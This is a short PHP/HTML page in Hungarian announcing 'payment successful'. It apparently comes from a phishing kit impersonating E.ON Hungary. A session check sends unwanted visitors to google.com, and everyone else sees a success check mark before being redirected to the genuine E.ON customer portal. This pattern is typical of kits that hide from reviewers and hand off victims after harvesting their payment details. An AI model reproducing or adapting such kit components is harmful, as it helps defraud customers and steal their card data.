<?php

session_start();
error_reporting(0);
	if(isset($_SESSION['access']) && $_SESSION['access'] == false){
		header("location:https://www.google.com");
	}

?>
<!DOCTYPE html>
<html>
<head>
	<title>fizetés sikeres</title>
  <meta http-equiv="refresh" content="3; URL=https://e-portal.eon-hungaria.com/">
</head>

<body>
	<center>
		<img style="top: -100px; width: 200px; height: 200px;" src="./files/check-512.png">
		<p>fizetés sikeres</p>
	</center>
</body>
</html>